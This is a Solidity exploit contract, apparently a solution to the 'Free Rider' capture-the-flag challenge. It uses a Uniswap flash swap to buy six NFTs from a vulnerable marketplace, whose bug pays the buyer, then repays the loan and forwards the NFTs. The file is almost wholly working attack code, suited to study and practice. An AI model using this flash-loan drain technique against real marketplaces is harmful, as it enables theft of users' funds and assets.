// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";

interface UniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IWETH9 {
    function withdraw(uint amount0) external;
    function deposit() external payable;
    function transfer(address dst, uint wad) external returns (bool);
    function balanceOf(address addr) external returns (uint);
}

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IERC721 {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

contract FreeRiderAttacker is IUniswapV2Callee {

    UniswapV2Pair immutable uniswapPair;
    IFreeRiderNFTMarketplace immutable marketPlace;
    IWETH9 immutable weth;
    IERC721 immutable nft;
    address buyer;
    uint256[] private tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(address _uniswapPairAddress,
        address payable _marketPlace,
        address _wethAddress,
        address _nftAddress,
        address _buyer
    ) {
        uniswapPair = UniswapV2Pair(_uniswapPairAddress);
        marketPlace = IFreeRiderNFTMarketplace(_marketPlace);
        weth = IWETH9(_wethAddress);
        nft = IERC721(_nftAddress);
        buyer = _buyer;
    }

    function attack(uint256 amount) external payable{
        //get a flash swap (loan) 15 WETH because now it pair DVT/WETH
        uniswapPair.swap(amount, 0, address(this), new bytes(1));
    }

    // Uniswap callback after receiving flash swap.
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        // exchange the loaned from 15 weth to eth
        weth.withdraw(amount0);
        console.log("Before buy 6 NFTs with 15 ETH");
        console.log(address(this).balance); // have 15000000000000000000 wei = 15 ETH
        // buy all nfts for free with a single 15 eth loan, because of the bug in the marketplace contract
        // that incorrectly determines the seller's address as the buyer's in line 80
        marketPlace.buyMany{value: address(this).balance}(tokenIds);
        console.log("after buy 6 NFTs, we got money that should go to seller(15x6)");
        console.log(address(this).balance); //got 90000000000000000000 wei= 90 ETH
        // exchange back from eth to weth
        weth.deposit{value: address(this).balance}();
        // pay back the flash loan
        weth.transfer(address(uniswapPair), weth.balanceOf(address(this)));
        //transfer all 6 NFTs to buyer
        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), address(buyer), i);
        }
    }

    /*
    The underlying mechanism is simple: when the "safeTransferFrom" method of ERC721 from contract A (Attacker)
    is invoked, the "onERC721Received" method in the receiving contract B (FreeRiderBuyer) is invoked as well, 
    passing whatever value was given to "safeTransferFrom". Use for verifies
    whether the receiving contract is capable of accepting the token that the sender is attempting to transfer.
    */
    function onERC721Received(address,address,uint256 _tokenId,bytes memory) external returns (bytes4){
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}